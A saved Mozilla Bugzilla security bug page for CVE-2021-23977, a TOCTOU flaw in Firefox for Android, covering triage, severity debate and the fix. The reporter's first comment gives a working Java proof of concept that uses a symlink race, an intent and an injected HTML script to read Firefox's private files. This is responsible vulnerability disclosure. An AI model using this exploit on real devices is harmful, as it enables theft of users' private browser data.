=== Content from bugzilla.mozilla.org_4abbbdc6_20250115_081455.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1684761)
* [XML](/show_bug.cgi?ctype=xml&id=1684761)

Closed
[Bug 1684761](/show_bug.cgi?id=1684761)
(CVE-2021-23977)

Opened 4 years ago
Closed 4 years ago

# Firefox for Android - Theft of sensitive data

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Firefox for Android - Theft of sensitive data

## Categories

### (Fenix :: General, defect)

[Product:](/describecomponents.cgi?product=Fenix)

Fenix
▾

Fenix
**Firefox for Android**: Fenix is an Android browser built using Android Components that re-imagines how a mobile browser would look if it was built from scratch to demonstrate better design for typical mobile use cases ([more info](https://www.mozilla.org/en-us/firefox/mobile/)).
[See Open Bugs in This Product](/buglist.cgi?product=Fenix&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Fenix)
Watch This Product

[Component:](/describecomponents.cgi?product=Fenix&component=General#General)

General
▾

Fenix :: General
For bugs in Firefox Android which do not fit into other more specific components
[See Open Bugs in This Component](/buglist.cgi?product=Fenix&component=General&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Fenix&component=General&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Fenix&component=General)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Android

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

--

Points:

---

## Tracking

### (firefox84 wontfix, firefox85 wontfix, firefox86 fixed)

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Score | --- |
| --- | --- |
| a11y-review | --- |
| Accessibility Severity | --- |
| Webcompat Priority | --- |
| Performance Impact | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox84 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox84&o1=equals&v1=wontfix) |
| firefox85 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox85&o1=equals&v1=wontfix) |
| firefox86 | --- | [fixed](/buglist.cgi?f1=cf_status_firefox86&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| firefox84 |  | wontfix |
| firefox85 |  | wontfix |
| firefox86 |  | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: gnehsoah, Assigned: agi, NeedInfo)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/2f23a572bdd06777026ab2c155cfe0c0?d=mm&size=40)  [agi](/user_profile?user_id=421286)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/8ccff8eaa2b37f2e78921275952f7d43?d=mm&size=40)  [gnehsoah](/user_profile?user_id=586010)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/e49a28e5fed7340a3e51d46100902d93?d=mm&size=40)  [boek](/user_profile?user_id=599885)

NeedInfo From:

 [Grisha](/user_profile?user_id=565489)

[4 years ago](#a1300327_388264)

[NeedInfo:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#needinfo)

Update

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

21 people

## References

### ( [URL](https://play.google.com/store/apps/details?id=org.mozilla.firefox&hl=en_US&gl=US "https://play.google.com/store/apps/details?id=org.mozilla.firefox&hl=en_US&gl=US") )

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[Duplicates:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#duplicates)

[1660704](/show_bug.cgi?id=1660704 "RESOLVED DUPLICATE - Firefox Android watch to app resource")

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[play.google.com/store/apps/details?id...](https://play.google.com/store/apps/details?id=org.mozilla.firefox&hl=en_US&gl=US "https://play.google.com/store/apps/details?id=org.mozilla.firefox&hl=en_US&gl=US")

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[bugs.chromium.org/p/chromium/issues/d...](https://bugs.chromium.org/p/chromium/issues/detail?id=144866 "https://bugs.chromium.org/p/chromium/issues/detail?id=144866")

## Details

### (Keywords: reporter-external, sec-moderate, Whiteboard: [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage][adv-main86+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2021-23977

[Keywords:](/describekeywords.cgi)

[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[reporter-external] [client-bounty-form] [verif?][post-critsmash-triage][adv-main86+]

Change Request:

---

Bug Flags:

| [freddy](/user_profile?user_id=428608) | [sec-bounty](#c27 "4 years ago") | + |
| --- | --- | --- |
| [freddy](/user_profile?user_id=428608) | sec-bounty | + |
| --- | --- | --- |
|  | sec-bounty-hof |  |
| --- | --- | --- |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (4 files)

| [app-debug.apk](/attachment.cgi?id=9195132)  [4 years ago](#c0)  [gnehsoah](/user_profile?user_id=586010)   1.56 MB, application/vnd.android.package-archive |  | [Details](/attachment.cgi?id=9195132&action=edit) |
| --- | --- | --- |
| [PoC\_SourceCode.zip](/attachment.cgi?id=9195133)  [4 years ago](#c1)  [gnehsoah](/user_profile?user_id=586010)   140.49 KB, application/zip |  | [Details](/attachment.cgi?id=9195133&action=edit) |
| [Bug 1684761 - Pass null principal for external loads.](/attachment.cgi?id=9195516)  [4 years ago](#c14)  [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)   48 bytes, text/x-phabricator-request |  | [Details](/attachment.cgi?id=9195516&action=edit) | [Review](/attachment.cgi?id=9195516) |
| [advisory.txt](/attachment.cgi?id=9204115)  [4 years ago](#c29)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   375 bytes, text/plain |  | [Details](/attachment.cgi?id=9204115&action=edit) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [gnehsoah](/user_profile?user_id=586010)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1684761#c0)• 4 years ago |
|  | |

Attached file
[app-debug.apk](attachment.cgi?id=9195132)
— [Details](attachment.cgi?id=9195132&action=edit)

There is a TOCTOU vulnerability that can lead to the theft of users' private files (such as cookies databases) in /data/data/org.mozilla.firefox/ .

PoC:

```
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        try {
            File payload = new File(getDataDir(), "test.html");
            payload.delete();
            payload.createNewFile();
            payload.setReadable(true, false);
            payload.setWritable(true, false);
            payload.setExecutable(true, false);
            FileOutputStream fos = null;
            fos = new FileOutputStream(payload);
            String evilhtml = "<html>\n" +
                    "<h1 id=\"try\"></h1>\n" +
                    "<script>\n" +
                    "let count = 1;\n" +
                    "let timer = setInterval(()=>{\n" +
                    "    document.getElementById(\"try\").innerHTML = \"try \" + count;\n" +
                    "    count++;\n" +
                    "    let xhr = new XMLHttpRequest();\n" +
                    "    try {\n" +
                    "        xhr.open(\"GET\", location.href, false);\n" +
                    "        xhr.send();\n" +
                    "        if(xhr.responseText.indexOf(\"#evilhtml#\") == -1) {\n" +
                    "            alert(xhr.responseText);\n" +
                    "            clearInterval(timer);\n" +
                    "        }\n" +
                    "    } catch(error){\n" +
                    "        //console.log(error);\n" +
                    "    }\n" +
                    "\n" +
                    "}, 100)\n" +
                    "</script>\n" +
                    "</html>";
            fos.write(evilhtml.getBytes());
            fos.close();

            Thread.sleep(1000); //adjust millis

            Intent intent = new Intent();
            intent.setComponent(new ComponentName("org.mozilla.firefox", "org.mozilla.gecko.LauncherActivity"));
            intent.setAction(Intent.ACTION_VIEW);
            intent.setData(Uri.fromFile(payload));
            startActivity(intent);

        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        try {
            Thread.sleep(5000); //adjust millis
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        Thread createFileThread = new Thread() {
            @Override
            public void run() {
                while(running) {

                    try {
                        File payload = new File(getDataDir(), "test.html");
                        payload.delete();
                        payload.createNewFile();
                        Runtime.getRuntime().exec("ln -sf /data/data/org.mozilla.firefox/shared_prefs/org.mozilla.firefox_preferences.xml "
                                + payload.getAbsolutePath()).waitFor();
                        payload.setReadable(true, false);
                        payload.setWritable(true, false);
                        payload.setExecutable(true, false);
                    }
                    catch(Exception e) {
                        // should be never thrown
                        e.printStackTrace();
                    }

                }
            }
        };

        createFileThread.start();

    }

```

Firefox Version: 84.1.2

Android Version: 9

Steps to reproduce:

1. Open the PoC app. (app-debug.apk)
2. It will theft the private file of firefox. (/data/data/org.mozilla.firefox/shared\_prefs/org.mozilla.firefox\_preferences.xml)

Screen record:

<https://drive.google.com/file/d/1rdvHF_i9tFuxLLilcNCBVJKcxnIz3L8y/view?usp=sharing>

Flags: sec-bounty?

|  | [gnehsoah](/user_profile?user_id=586010)  Reporter |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1684761#c1)• 4 years ago |
|  | |

Attached file
[PoC\_SourceCode.zip](attachment.cgi?id=9195133)
— [Details](attachment.cgi?id=9195133&action=edit)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1684761#a16612_159069)• 4 years ago |

Group: firefox-core-security → mobile-core-securityType: task → defectComponent: Security → Security: AndroidProduct: Firefox → Fenix

|  | [Kevin Brosnan [Ex-Mozilla]](/user_profile?user_id=406670) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1684761#c2)• 4 years ago |
|  | |

Christian has done work with intents in the past. Please evaluate the risk here.

Flags: needinfo?(csadilek)

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1684761#c3)• 4 years ago |
|  | |

I think the summary here is:

* Malicious app creates a symlink from `$DATADIRECTORY/test.html` to `/data/data/org.mozilla.firefox/shared_prefs/org.mozilla.firefox_preferences.xml`
* Malicious app sets file permissions so that any app can read `$DATADIRECTORY/test.html`
* Malicious app asks Firefox to open `test.html`, which is linked to `...preferences.xml` and thus that file loads

What we see is Firefox opening a file that it owns. It does look sketchy but it works because Firefox can read it's own `org.mozilla.firefox_preferences.xml`.

We do not see the 'stolen' file leave Firefox. Is that something that is possible?

If we have code that prevents files from /data/data/org.mozilla.firefox/ to be loaded, do have to amend that code with something to resolve symlinks?

Looping in Agi because I think we dealt with something very similar in Fennec that was also around symlinks. I can't find the bug for that one though - Kevin do you know?

Flags: needinfo?(agi)

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1684761#c4)• 4 years ago |
|  | |

This looks similar to <https://bugs.chromium.org/p/chromium/issues/detail?id=144866>

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1684761#c5)• 4 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1684761&comment_id=15201104 "1 revision") |
|  | |

Stefan, I think the bug you're thinking about is [Bug 1647078](/show_bug.cgi?id=1647078 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known")

Flags: needinfo?(agi)

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1684761#c6)• 4 years ago |
|  | |

we should probably consider forbidding any files from loading as content html from the `data` dir in GeckoView, that's a big footgun otherwise.

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1684761#c7)• 4 years ago |
|  | |

Where would we make this change? Would this be in GeckoView or Android-Components?

Flags: needinfo?(agi)

|  | [Christian Sadilek [:csadilek]](/user_profile?user_id=590895) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1684761#c8)• 4 years ago |
|  | |

> Christian has done work with intents in the past. Please evaluate the risk here.

I'd recommend sec-moderate in line with <https://bugs.chromium.org/p/chromium/issues/detail?id=144866> as it requires a malicious app to be installed.

> Where would we make this change? Would this be in GeckoView or Android-Components?

I think we should fix this in both GeckoView and Fenix/A-C:

* In Fenix as we don't support loading `file://` URLs and therefore should also not support them via intents
* In GV as we might want to support it in the future or in other GV apps and should prevent loading internal files as content
Flags: needinfo?(csadilek)

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1684761#c9)• 4 years ago |
|  | |

Christian how do you feel about shipping this in 85? We still have three weeks of Beta ahead of us, is that enough time?

Because this requires a malicious app on the side, I would suggest to not uplift to 84.

Flags: needinfo?(csadilek)

|  | [Christian Sadilek [:csadilek]](/user_profile?user_id=590895) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1684761#c10)• 4 years ago |
|  | |

> Christian how do you feel about shipping this in 85?

Fenix/A-C change should be fine but let's decide once the fix and reviews are up tomorrow?

Flags: needinfo?(csadilek)

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1684761#c11)• 4 years ago |
|  | |

Christian responded, but yeah we should disallow loading `data` paths in GV and disallow loading a `file` intent in Fenix/AC.

Flags: needinfo?(agi)

|  | [Christian Sadilek [:csadilek]](/user_profile?user_id=590895) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1684761#c12)• 4 years ago |
|  | |

I was wrong about Fenix not supporting `file://` URLs when loaded via the toolbar. Despite all issues being closed as "won't fix", loading a local file works fine. I just successfully loaded an image from `file://storage/...` in Fenix release (84.1.2).

So the GV solution above would be sufficient, but the Fenix/A-C one would only cover intents.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1684761#a142150_1689)• 4 years ago |

Keywords: [sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)See Also: → <https://bugs.chromium.org/p/chromium/issues/detail?id=144866>

|  | [Christian Sadilek [:csadilek]](/user_profile?user_id=590895) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1684761#c13)• 4 years ago |
|  | |

Agi, Sebastian and I discussed this some more:

* A short-term fix in GV to disallow loading app-internal files isn't realistic.
* Loading `file://` URLs in Fenix works by accident and is not officially supported.

We decided to work on a short-term fix in A-C to prevent loading `file://` and `content://` URLs. A bigger discussion will be needed if we ever want to support `file://` URLs.

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1684761#c14)• 4 years ago |
|  | |

Attached file
[Bug 1684761 - Pass null principal for external loads.](attachment.cgi?id=9195516)
— [Details](attachment.cgi?id=9195516&action=edit)

|  | [Phabricator Automation](/user_profile?user_id=600971) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1684761#a201798_600971)• 4 years ago |

Assignee: nobody → agi

|  | [Christian Sadilek [:csadilek]](/user_profile?user_id=590895) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1684761#c15)• 4 years ago |
|  | |

A-C/Fenix fix landed in Nightly (210107 17:00).

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1684761#c16)• 4 years ago |
|  | |

<https://hg.mozilla.org/mozilla-central/rev/d0c2b70d78ad>

Please nominate for Beta approval when you get a chance.

Status: UNCONFIRMED → RESOLVEDClosed: 4 years ago
[status-firefox84](/buglist.cgi?f1=cf_status_firefox84&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox84&o1=equals&v1=wontfix)
[status-firefox85](/buglist.cgi?f1=cf_status_firefox85&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox85&o1=equals&v1=affected)
[status-firefox86](/buglist.cgi?f1=cf_status_firefox86&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox86&o1=equals&v1=fixed)Flags: needinfo?(agi)Resolution: --- → FIXED

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1684761#a391127_75935)• 4 years ago |

Group: mobile-core-security → core-security-release

|  | [Christian Sadilek [:csadilek]](/user_profile?user_id=590895) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1684761#c17)• 4 years ago |
|  | |

I think uplifting the A-C fix to A-C 70 (for Fenix 85) is sufficient. We don't necessarily need the GV fix uplifted. This would also cover 1659035.

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1684761#c18)• 4 years ago |
|  | |

Yeah the fix in AC should be enough, the GV fix is there so that if we ever allow more protocols in the URL bar the intent case is still covered.

Flags: needinfo?(agi)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1684761#a443334_75935)• 4 years ago |

[status-firefox85](/buglist.cgi?f1=cf_status_firefox85&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox85&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox85&o1=equals&v1=wontfix)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1684761#c19)• 4 years ago |
|  | |

What's in the shared\_prefs directory? Is that fixed "Firefox" generated data or actual user settings? On Desktop and Fennec we used randomized profile names to prevent this kind of blind poking into user sensitive data like cookies and localstorage, etc.

Flags: needinfo?(agi)

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1684761#c20)• 4 years ago |
|  | |

It depends on the app, but it would normally contain UI preferences like "theme" , default font size, default tracking protection options and the like.

Redirecting to Stefan in case Fenix does something unexpected with shared preferences.

Flags: needinfo?(agi)

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1684761#a797061_421286)• 4 years ago |

Flags: needinfo?(sarentz)

|  | [gnehsoah](/user_profile?user_id=586010)  Reporter |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1684761#c21)• 4 years ago |
|  | |

The profile path is random, but the attacker can get it by reading the `/data/user/0/org.mozilla.firefox/files/mozilla/profiles.ini` file.

<https://bugzilla.mozilla.org/show_bug.cgi?id=1647078>

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1684761#c22)• 4 years ago |
|  | |

(In reply to gnehsoah from [comment #21](/show_bug.cgi?id=1684761#c21 "RESOLVED FIXED - Firefox for Android - Theft of sensitive data"))

> The profile path is random, but the attacker can get it by reading the `/data/user/0/org.mozilla.firefox/files/mozilla/profiles.ini` file.
>
> <https://bugzilla.mozilla.org/show_bug.cgi?id=1647078>

But that's not within the shared\_prefs folder, right?

Flags: needinfo?(gnehsoah)

|  | [gnehsoah](/user_profile?user_id=586010)  Reporter |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1684761#c23)• 4 years ago |
|  | |

Maybe I didn’t make it clear, this vulnerability can read files in the `/data/data/org.mozilla.firefox/` directory, including `/data/user/0/org.mozilla.firefox/files/mozilla/profiles.ini` files, not limited to the shared\_prefs folder.

Flags: needinfo?(gnehsoah)

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1684761#c24)• 4 years ago |
|  | |

(In reply to Agi Sferro | :agi | ni? for questions | ⏰ PST | he/him from [comment #20](/show_bug.cgi?id=1684761#c20 "RESOLVED FIXED - Firefox for Android - Theft of sensitive data"))

> Redirecting to Stefan in case Fenix does something unexpected with shared preferences.

This is what I have in `/data/data/org.mozilla.firefox/shared_prefs`:

```
-rw-rw---- 1 u0_a195 u0_a195  154 2020-10-21 14:34 MOZAC_GECKO_ENGINE.xml
-rw-rw---- 1 u0_a195 u0_a195 5673 2021-01-08 11:04 __leanplum__.xml
-rw-rw---- 1 u0_a195 u0_a195  352 2020-10-21 14:34 __leanplum_push__.xml
-rw-rw---- 1 u0_a195 u0_a195  122 2020-10-21 14:34 adjust_preferences.xml
-rw-rw---- 1 u0_a195 u0_a195  122 2021-01-08 11:04 androidx.work.util.id.xml
-rw-rw---- 1 u0_a195 u0_a195 2519 2021-01-08 10:34 com.google.android.gms.appid.xml
-rw-rw---- 1 u0_a195 u0_a195   65 2020-10-21 14:35 core_prefs_kp_post_m.xml
-rw-rw---- 1 u0_a195 u0_a195  173 2020-10-21 14:35 core_prefs_kp_pre_m.xml
-rw-rw---- 1 u0_a195 u0_a195  553 2021-01-08 10:43 fenix-search-engine-provider.xml
-rw-rw---- 1 u0_a195 u0_a195  129 2020-10-21 14:35 fenix.onboarding.xml
-rw-rw---- 1 u0_a195 u0_a195  640 2021-01-08 10:57 fenix_preferences.xml
-rw-rw---- 1 u0_a195 u0_a195   65 2020-10-21 14:34 fxaStateAC_kp_pre_m.xml
-rw-rw---- 1 u0_a195 u0_a195  162 2021-01-08 10:34 mozac.service.location.region.xml
-rw-rw---- 1 u0_a195 u0_a195  161 2020-10-21 14:34 mozac_feature_accounts_push.xml
-rw-rw---- 1 u0_a195 u0_a195  329 2021-01-08 10:34 mozac_feature_push.xml
-rw-rw---- 1 u0_a195 u0_a195  206 2021-01-08 10:34 mozilla.telemetry.glean.scheduler.MetricsPingScheduler.xml
-rw-rw---- 1 u0_a195 u0_a195  116 2020-10-21 14:35 org.mozilla.fenix.components.metrics.ActivationPing.prefs.xml
-rw-rw---- 1 u0_a195 u0_a195  116 2020-10-21 14:35 org.mozilla.fenix.components.metrics.FirstSessionPing.prefs.xml
-rw-rw---- 1 u0_a195 u0_a195  857 2021-01-08 10:45 org.mozilla.firefox_preferences.xml

```

I think some of those files have things that we don't like to be easily pulled out of the app. I see a bunch of things like:

* FCM Push Token
* `fxa_push_scope`
* Some Leanplum data
* `fxaStateAC_kp_pre_m.xml`

I don't know how sensitive any of this is. If shared preferences are considered unsafe then we can start an effort to move things to a different place. But for this I would need advice from someone more familiar with Android details/security.

Flags: needinfo?(sarentz)

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1684761#c25)• 4 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1684761&comment_id=15221879 "2 revisions") |
|  | |

I would like some more feedback on this from an Android expert, but I *think* Shared Preferences are fine except in two cases:

* Having root access to the device (which IMO is game over, and requires some serious steps to get there)
* Application errors that accidentally expose shared preferences

However, I think as a best practice, Google is recommending that Shared Preferences are encrypted through `androidx.security:security-crypto`, which has a `EncryptedSharedPreferences`. As with all Android on-device crypto, whether this improves things probably greatly depends on the Android version/flavor and Device.

Who can weigh in? Personally I like hardening our data storage to make accidental file exposure less of a risk.

Asking Grisha, Sebastian and Christian to give this a thought and leave some comments here.

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1684761#a1300327_388264)• 4 years ago |

Flags: needinfo?(s.kaspari)Flags: needinfo?(gkruglov)Flags: needinfo?(csadilek)

|  | [Cornel Ionce [:noni] [Hubs QA]](/user_profile?user_id=458186) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1684761#a2234583_458186)• 4 years ago |

Whiteboard: [reporter-external] [client-bounty-form] [verif?] → [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage]

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1684761#c26)• 4 years ago |
|  | |

Christian told me via Slack that exploiting this bug would include private data. Bumping to sec-high.

Keywords: [sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---) → [sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1684761#c27)• 4 years ago |
|  | |

After a bit of a discussion, we are re-considering it as sec-moderate.

The bug violates the SOP and allows reading sensitive data, but it still requires a malicious app to be present on the user's device.

Flags: sec-bounty? → sec-bounty+Keywords: [sec-high](/buglist.cgi?keywords=sec-high&resolution=---) → [sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

|  | [Christian Sadilek [:csadilek]](/user_profile?user_id=590895) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1684761#c28)• 4 years ago |
|  | |

Clearing NI. Enabling file:// urls in Fenix depends on [Bug 1684947](/show_bug.cgi?id=1684947 "NEW - Disallow loading file:/// URIs from within the data folder").

Flags: needinfo?(csadilek)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1684761#a3936854_578488)• 4 years ago |

Whiteboard: [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage] → [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage][adv-main86+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1684761#c29)• 4 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9204115)
— [Details](attachment.cgi?id=9204115&action=edit)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1684761#a4021641_578488)• 4 years ago |

Alias: CVE-2021-23977

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1684761#a27965121_1689)• 3 years ago |

Group: core-security-release

|  | [Sebastian Kaspari (:sebastian; :pocmo)](/user_profile?user_id=472516) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1684761#a31694430_472516)• 3 years ago |

